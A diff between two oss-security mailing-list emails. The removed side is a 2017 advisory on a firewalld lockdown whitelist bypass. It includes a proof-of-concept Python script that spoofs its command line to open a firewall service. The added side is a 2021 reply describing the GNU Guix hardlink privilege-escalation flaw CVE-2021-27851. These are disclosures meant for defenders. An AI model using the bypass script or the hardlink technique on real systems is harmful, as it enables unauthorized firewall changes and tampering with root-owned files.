@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["7300" "Thursday" "13" "July" "2017" "18:34:42" "+0200" "Matthias Gerstner" "mgerstner@suse.de" "<20170713163442.GA14986@f195.suse.de>" "196" "[oss-security] firewalld: lockdown whitelist cmdline access check is not secure" nil nil nil "7" "2017071316:34:42" "[oss-security] firewalld: lockdown whitelist cmdline access check is not secure" (number mark "U       mgerstner@su Jul 13  196/7300  " thread-indent "\"[oss-security] firewalld: lockdown whitelist cmdline access check is not secure\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["1789" "Saturday" "10" "April" "2021" "13:58:40" "-0400" "Leo Famulari" "leo@famulari.name" nil "47" "Re: [oss-security] Risk of local privilege escalation in GNU Guix" nil nil nil "4" nil nil (number mark "U       leo@famulari Apr 10   47/1789  " thread-indent "\"Re: [oss-security] Risk of local privilege escalation in GNU Guix\"\n") nil nil nil nil nil nil nil nil nil "Re: [oss-security] Risk of local privilege escalation in GNU Guix" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 11396 invoked by uid 550); 13 Jul 2017 16:42:01 -0000
+Received: (qmail 3842 invoked by uid 550); 10 Apr 2021 18:01:01 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,212 +12,96 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 18364 invoked from network); 13 Jul 2017 16:34:54 -0000
-X-Virus-Scanned: by amavisd-new at test-mx.suse.de
-Date: Thu, 13 Jul 2017 18:34:42 +0200
-From: Matthias Gerstner <mgerstner@suse.de>
+Received: (qmail 3310 invoked from network); 10 Apr 2021 17:58:54 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=famulari.name;
+	 h=date:from:to:subject:message-id:references:mime-version
+	:content-type:in-reply-to; s=mesmtp; bh=xFHn85ZzJRpAna1s8UPRU/Pn
+	Thz3RJ3R7mqkoSruDzU=; b=lOV/doQbXETvUDYnxhAqvUeEXG1ELzXNFp+puueF
+	dLoW4XJIWQA3lX2Q5bt0w8UZWd2L7As3fdCvQz6hSc/v70hDNnErTHYG1c7oQ9qT
+	w5xCGLbBNkUPT2VXPXIzM6QlNTpKEX+ilzni/UNIMfzluC3ZBOXdOnUKjwaj1Ho/
+	8ko=
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=
+	messagingengine.com; h=content-type:date:from:in-reply-to
+	:message-id:mime-version:references:subject:to:x-me-proxy
+	:x-me-proxy:x-me-sender:x-me-sender:x-sasl-enc; s=fm2; bh=xFHn85
+	ZzJRpAna1s8UPRU/PnThz3RJ3R7mqkoSruDzU=; b=l95BZH2HlrRGCpVZpZkwgQ
+	lXzw0BQISZsKsFgpMjVjGOv24NVELUofiCJDC3nG9hiI1p9PNk2CeqkIXls7godl
+	/fDMPQSePcK6U4cCj1ouvlDXaJT7UaiIKplFHRc0NMr5wOW1vvO0Z+YHFfNG1yy6
+	eHXTmTaDd0ed+/kmRnb928cOFZUf8KU4xEWmbEIFB5J31vGXQPV1Y2OJOl+JNTIs
+	8+VWZdSS9LwNv2cGiO80k3YmUInPm+Z98S2HqET+M3GoAarMX66pejMD2eIpQJQe
+	Es2Ui2Ds0PpT+5f7On0ASF0+E2o6ZeB126nw8ErmrC4NY3DWaj99Sc05Ny+1IWLw
+	==
+X-ME-Sender: <xms:UedxYFNmaN5cYPsyGftUo_vIzh7xXEM0N8Q71DAlwx6MdB5R0rT5mg>
+    <xme:UedxYH8_3BQTiTZbvFY0hsbRxnBTKLWCu37cxVw4_IF8ZT4_R6erREs55KQqyw70w
+    j8-xapPmjN5jtxlqw>
+X-ME-Proxy-Cause: gggruggvucftvghtrhhoucdtuddrgeduledrudekfedguddvtdcutefuodetggdotefrod
+    ftvfcurfhrohhfihhlvgemucfhrghsthforghilhdpqfgfvfdpuffrtefokffrpgfnqfgh
+    necuuegrihhlohhuthemuceftddtnecunecujfgurhepfffhvffukfhfgggtuggjsehgtd
+    erredttddvnecuhfhrohhmpefnvghoucfhrghmuhhlrghrihcuoehlvghosehfrghmuhhl
+    rghrihdrnhgrmhgvqeenucggtffrrghtthgvrhhnpedukeevgeetkeeltefgiedtjefgje
+    ekffduteehvdfhueekudelieekjeefheffteenucfkphepuddttddruddurdduieelrddu
+    udeknecuvehluhhsthgvrhfuihiivgeptdenucfrrghrrghmpehmrghilhhfrhhomheplh
+    gvohesfhgrmhhulhgrrhhirdhnrghmvg
+X-ME-Proxy: <xmx:UedxYER7R2VZXI9Il7fYvSXLCCTqCYpJMZopir5lpZRdbLa0eRUYFQ>
+    <xmx:UedxYBsAwjfS2zphfp7rPo0uWRB9uIxNAbKxD-5t52FpWsRMkzB_3Q>
+    <xmx:UedxYNcR2sgq_ckbZtiEIf0dpXz2TUTop_mxZK7sGlKNx8x9K0v5ag>
+    <xmx:UudxYHooUmaZTkNLlhmcry-9fOD6AOfzhjZWbhaoBAiNGe7yIiN-lQ>
+Date: Sat, 10 Apr 2021 13:58:40 -0400
+From: Leo Famulari <leo@famulari.name>
 To: oss-security@lists.openwall.com
-Message-ID: <20170713163442.GA14986@f195.suse.de>
+Message-ID: <YHHnUFzvU0prUY/j@jasmine.lan>
+References: <YFPFrYcJK1e+qedn@jasmine.lan>
 MIME-Version: 1.0
-Content-Type: multipart/signed; micalg=pgp-sha1;
-	protocol="application/pgp-signature"; boundary="gj572EiMnwbLXET9"
+Content-Type: multipart/signed; micalg=pgp-sha256;
+	protocol="application/pgp-signature"; boundary="9Qdp6wawXKlMHJDf"
 Content-Disposition: inline
-User-Agent: Mutt/1.5.24 (2015-08-30)
-Subject: [oss-security] firewalld: lockdown whitelist cmdline access check is not secure
+In-Reply-To: <YFPFrYcJK1e+qedn@jasmine.lan>
+Subject: Re: [oss-security] Risk of local privilege escalation in GNU Guix
 
---gj572EiMnwbLXET9
-Content-Type: multipart/mixed; boundary="qDbXVdCdHGoSgWSk"
-Content-Disposition: inline
-
-
---qDbXVdCdHGoSgWSk
-Content-Type: text/plain; charset=iso-8859-1
+--9Qdp6wawXKlMHJDf
+Content-Type: text/plain; charset=us-ascii
 Content-Disposition: inline
 Content-Transfer-Encoding: quoted-printable
 
-This is a about a security issue I've found in firewalld. It is related
-to the "lockdown" feature in firewalld. By default firewalld allows any
-local applications to perform operations on the firewall. The applied
-security model here is the use of polkit rules. Modifying the firewall
-by default requires admin privileges (i.e. 'admin_auth_keep').
+On Thu, Mar 18, 2021 at 05:27:09PM -0400, Leo Famulari wrote:
+> # Vulnerability
+>=20
+> The attack consists in having an unprivileged user spawn a build process,=
+ for=20
+> instance with `guix build`, that makes its build directory world-writable=
+.  The=20
+> user then creates a hardlink to a root-owned file such as `/etc/shadow` i=
+n that
+> build directory.  If the user passed the `--keep-failed` option and the b=
+uild
+> eventually fails, the daemon changes ownership of the whole build tree,
+> including the hardlink, to the user.  At that point, the user has write a=
+ccess
+> to the target file.
 
-The "lockdown" feature is an additional / alternative security scheme
-implemented in firewalld. It is supposed to restrict firewall
-modifications via the D-Bus interface of firewalld to processes matching
-a whitelist configuration. It is not active by default. The following
-whitelisting categories are available (also see `man
-firewalld.lockdown-whitelist` [5]):
+This is CVE-2021-27851.
 
-1) processes running with a specific SELinux context
-2) processes running as a specific user
-3) processes running a specific command line
+We are very grateful for the invaluable assistance of CERT/CC in getting
+this assigned.
 
-While 1) and 2) seem not to be problematic, variant 3) is easily
-bypassed by an attacker. The command line of a requesting process is
-determined in firewalld via
-
-	dbus_utils.py:command_of_sender(),command_of_pid()
-
-which in the end checks /proc/<pid>/cmdline of the requesting process.
-The evaluation of this happens in
-
-	server/config.py:accessCheck()
-
-and
-
-	server/firewalld.py:accessCheck()
-
-The problems with checking /proc/<pid>/cmdline for this purpose are the
-following:
-
-- it is prone to race conditions. The requesting process can try to
-  replace itself by some other command that didn't ever send a dbus
-  request, before firewalld can make the check
-
-- every program can change its cmdline to arbitrary values without
-  special privileges using the "setproctitle" approach
-
-Thus any program can effectively bypass the whitelist check by just
-changing its cmdline to one of the whitelisted ones. Since there is an
-entry in the shipped whitelist for 'firewall-config', the lockdown can
-be bypassed in default installations, if a user relies on the lockdown
-feature for security instead of safe polkit rules.
-
-As I see it currently the only protection against this are strict polkit
-rules that require admin authorization for all sensitive dbus methods of
-firewalld. This is currently the case for the polkit rules shipped with
-firewalld. However, individual distributions or users might choose to
-lessen the polkit authorization checking, relying on the lockdown
-feature to provide security.
-
-Upstream told me that they know that the lockdown feature is not secure
-and they wouldn't know how to fix it, except for removing the feature
-completely.  It seems to me the intention of the feature is to protect
-only against unwanted misconfiguration but not against malicious
-programs or users.  However, the documentation in the firewalld wiki,
-man pages and source code give no clear warning about the limited
-security the lockdown feature can provide.
-
-This report is a heads-up, because an unaware user or integrator might
-be tempted to rely on the lockdown feature for security for some reason.
-
-Please find attached a proof of concept python program that demonstrates
-the bypass of an active lockdown. It renames itself to the whitelisted
-firewall-config command and then issues a command to open 'imaps' in the
-public zone.
-
-I did not request a CVE for this as of yet. If you think it is worth one
-please tell me so and I will request it.
-
-References:
-
-[1] https://fedoraproject.org/wiki/Features/FirewalldLockdown
-[2] https://fedoraproject.org/wiki/Firewalld?rd=3DFirewallD#Lockdown
-[3] https://github.com/firewalld/firewalld
-[4] http://www.firewalld.org/documentation/man-pages/firewall-cmd.html
-[5] http://www.firewalld.org/documentation/man-pages/firewalld.lockdown-whi=
-telist.html
-
---=20
-Matthias Gerstner <matthias.gerstner@suse.de>
-Dipl.-Wirtsch.-Inf. (FH), Security Engineer
-https://www.suse.com/security
-Telefon: +49 911 740 53 290
-
-SUSE Linux GmbH=20
-GF: Felix Imend=F6rffer, Jane Smithard, Graham Norton
-HRB 21284 (AG Nuernberg)
-
---qDbXVdCdHGoSgWSk
-Content-Type: text/x-python; charset=us-ascii
-Content-Disposition: attachment; filename="fwd_setproctitle_poc.py"
-Content-Transfer-Encoding: quoted-printable
-
-#!/usr/bin/env python
-
-# this is a proof of concept that the firewalld lockdown implementation up
-# until current version 0.4.4.5 is flawed.
-#
-# firewalld maintains a whitelist of commands that are allowed to bypass the
-# lockdown (/etc/firewalld/lockdown-whitelist.xml).
-# However, the command name is calculated from /proc/<pid>/cmdline in
-# src/firewall/dbus_utils.py[command_of_pid]. This value is under attacker
-# control and can easily be changed via setproctitle (which is a piece of c=
-ode
-# that does the low level fiddling to achieve this, also found in util-linu=
-x,
-# here a python module is used).
-
-# this proof of concept changes its own cmdline to the one that is by defau=
-lt
-# in firewalld's whitelist to bypass the lockdown. you can run this as a
-# regular user, for uid 0 the lockdown is whitelisted anyways.
-#
-# Run 'firewall-cmd --lockdown-on' as root prior to testing this
-#
-# Depending on the polkit rules setup in your system you may to run this in
-# the context of a polkit agent and enter the user or administrator
-# password (the latter would be mitigating this issue for your setup).
-
-from __future__ import print_function
-import os, sys
-
-try:
-	import pydbus
-except ImportError:
-	print("You need to install pydbus from https://github.com/LEW21/pydbus")
-	print()
-	print("Try 'pip install --user pydbus")
-	sys.exit(1)
-
-try:
-	import setproctitle
-except ImportError:
-	print("You need to install setproctitle from https://pypi.python.org/pypi/=
-setproctitle")
-	print()
-	print("Try 'pip install --user setproctitle")
-	sys.exit(1)
-
-# change this to a whitelisted command to work around an active firewalld
-# lockdown
-setproctitle.setproctitle("/usr/bin/python -Es /usr/bin/firewall-config")
-
-bus =3D pydbus.SystemBus()
-
-firewalld =3D bus.get("org.fedoraproject.FirewallD1")
-
-try:
-	# to avoid an error on double-add
-	firewalld.removeService("public", "imaps")
-except:
-	pass
-
-# try to open some service on the public zone
-firewalld.addService("public", "imaps", 0)
-
---qDbXVdCdHGoSgWSk--
-
---gj572EiMnwbLXET9
+--9Qdp6wawXKlMHJDf
 Content-Type: application/pgp-signature; name="signature.asc"
-Content-Description: Digital signature
 
 -----BEGIN PGP SIGNATURE-----
-Version: GnuPG v2
 
-iQIcBAEBAgAGBQJZZ6EiAAoJEBTEBclxkjVTtLwP/2ttJEf9HChpDmvjgKytG6sa
-PjfOmBrgAF47jOsOmuJeXmcx9pOq43XdPpeCPQpKrH+RGCABf+ip9822PxVmqRMH
-2lEIGI6FX9rbm5vZGsKqtjdBFgGguKX/STg56L9lb1d3ntylaKeG28IXs/qJiU4s
-Gv15SHdhurCaX5s+1mF0kthlBT16Q9eVfcUSjaj3vbp8/JgqnJWL1HQMoJuDf6T+
-ZQAW3bYUz3FmT9mevFnDRid+zuh9Oa3Rh3iMU4dQzmbdP3TYM5FcDolm8LlZ1L3K
-IdRp4gXICeKECqpeGkGY4tVFzBQgQLEOZ4oeH0bMc1mug3ZhfLJ/d3I5Vp99gY8C
-L4ZPzcCgxEAizt2mf+C341VkphqjzbiS35whyBF/xY/4hNdQp6I7IqMjAEJo9oYM
-1+hvcnD1Z4JhaZcrBshpNqjOsVbZkGTe+/TSyad7xksfY8oL1B8E7Ufn6LjzGy1U
-bi7yf0DvoFvPFFiVTwDkqAfJ0MfnDcCqSHOaPYHhdbL6m8F1YUJQeuhUGvwnLHQz
-5cfJmzjvtY6VX3FWc4JhdjE+jXVCgJykzJmoh1OkfJ70EtQRrdbuQA7wFws1mk5k
-A1Pv6GQ9Wf1UyOaAPP+KlvDjkbFQOZwCeLGErtMSKYoYn+14t22aHbM/gBRXjAAq
-tsp4nLnkmp7F5A8j2asa
-=jkz+
+iQIzBAABCAAdFiEEsFFZSPHn08G5gDigJkb6MLrKfwgFAmBx508ACgkQJkb6MLrK
+fwh2+Q/+Po+zL1PaVprFE/UuIiBUPbhWqS3eaOIDmZy0avEggQ4lddE+KyFXzLDc
+4Yd6Dp8/nJwM9Gjk7wYiM6KzZPw9aHPYs1YZD9hRuW8bvSRsF89Mw54kwrALbs/v
+0twbn7cDwK1mHlMdLZ2N6VocmFZSRnIXRwqnF7OasWU4U3BGDbn8CghDx5wo6zhL
+dH0IzyRPstYlCQP/Mq6nDJ7KNCKSbnzAai6+r4HB55FYI1pju+0KnQbncqbCggaU
+qPewH8gf1EkmE5BJbZRJHw9ADTpF6IF7qkkMsg7p7kHCMTKCg9UXgknfu7ieQX1X
+WMRoYYSTNndQA5c42pR6tITYpqVxs7IAPeJPJP90er54EUak1IgZWLJJxyoIbyIL
+nKaFZROGp0W5QQdIfaULVuUswSQeCVB+vUMjmyS1C1gkG2Uesu/ZyCOuB0deiZph
+20g4VbkexlJkFqe/gHbZDgNjY9IYMbosJNxgUOCvltPUcjhpb2KZnjYPfVXcxwdC
+rwxIRy4D8S+YhF6BpHiUrjNHJGyNFgBcb89A139LXFU2SxJdR0hHL5idZREATyBK
+0TJGrG+NK58WkVE+M4FdoTkSUNYlUIaejUsQZ9nC8qsgQJDBd4BIPJQW0olKsvVb
+NLYA9G0tvQgNqHu6OAd9QqnzZXZahB0REvxxZu5dtO7vVXfYlRA=
+=cKam
 -----END PGP SIGNATURE-----
 
---gj572EiMnwbLXET9--
+--9Qdp6wawXKlMHJDf--
